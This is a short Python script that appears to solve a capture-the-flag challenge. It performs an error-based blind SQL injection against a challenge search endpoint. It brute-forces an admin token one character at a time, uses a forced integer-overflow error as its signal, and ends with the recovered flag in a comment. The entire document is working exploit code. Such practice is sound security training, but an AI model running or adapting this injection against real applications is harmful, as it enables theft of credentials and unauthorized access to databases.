import requests
import string
flag=""
caratteri_completi = string.ascii_letters + string.digits + string.punctuation
print(len(caratteri_completi))
for i in range(1,41):
    for lettera in caratteri_completi:
        url=f"https://213cf4c5-9d1f-4e96-bcd3-77b92e28c532.offsec.m0lecon.it/search?q=%25%27+AND+%28SELECT+CASE+WHEN+SUBSTR%28%28SELECT+value+FROM+internal_config+WHERE+key%3D%27admin_token%27%29%2C{i}%2C1%29%3D%27{lettera}%27+THEN+ABS%28-9223372036854775808%29+ELSE+1+END%29+--"
        c=requests.get(url)
        
        if "overflow"  in c.text:
            flag+=lettera
            print(flag)
            break
print(flag)
 #offsec{st4ck3d_qu3r1es_tiHdO0jfoHc4G7uO}